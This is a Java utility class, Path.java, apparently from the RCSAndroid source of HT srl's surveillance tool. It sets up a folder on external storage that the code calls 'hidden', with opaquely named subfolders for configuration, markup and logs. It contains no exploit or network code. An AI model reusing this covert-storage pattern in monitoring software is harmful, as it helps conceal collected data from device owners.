/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : Path.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.file;

import java.io.File;

import android.os.Environment;
import android.util.Log;

// TODO: Auto-generated Javadoc
/**
 * The Class Path.
 */
public class Path {

	/** The Constant TAG. */
	private static final String TAG = "PATH";

	/** The Constant CONF_DIR. */
	private static final String CONF_DIR = "cdd/";
	// public static final String DEBUG_DIR = "dwm/";
	/** The Constant MARKUP_DIR. */
	private static final String MARKUP_DIR = "msdd/";
	
	/** The Constant LOG_DIR. */
	private static final String LOG_DIR = "ldd/";

	// public static final String UPLOAD_DIR = "";

	/**
	 * Hidden.
	 *
	 * @return the string
	 */
	public static String hidden() {
		return Environment.getExternalStorageDirectory() + "/" + "rcs/";
	}

	/**
	 * Make dirs.
	 *
	 * @return true, if successful
	 */
	public static boolean makeDirs() {

		try {
			createDirectory(conf());
			createDirectory(markup());
			createDirectory(logs());

			return true;
		} catch (final Exception e) {
			Log.e(TAG, e.toString());
		}
		return false;
	}

	/**
	 * Conf.
	 *
	 * @return the string
	 */
	public static String conf() {
		return hidden() + CONF_DIR;
	}

	/**
	 * Markup.
	 *
	 * @return the string
	 */
	public static String markup() {
		return hidden() + MARKUP_DIR;
	}

	/**
	 * Logs.
	 *
	 * @return the string
	 */
	public static String logs() {
		return hidden() + LOG_DIR;
	}

	/**
	 * Removes the directory.
	 *
	 * @param dir the dir
	 * @return true, if successful
	 */
	public static boolean removeDirectory(final String dir) {
		final File file = new File(dir);
		return file.delete(); // TODO: anche su directory piene!
	}

	/**
	 * Creates the directory.
	 *
	 * @param dir the dir
	 * @return true, if successful
	 */
	public static boolean createDirectory(final String dir) {
		final File file = new File(dir);
		file.mkdirs();
		return file.exists() && file.isDirectory();
	}

	/**
	 * Free space.
	 *
	 * @return the long
	 */
	public static long freeSpace() {
		// TODO Auto-generated method stub
		return Long.MAX_VALUE;
	}

}
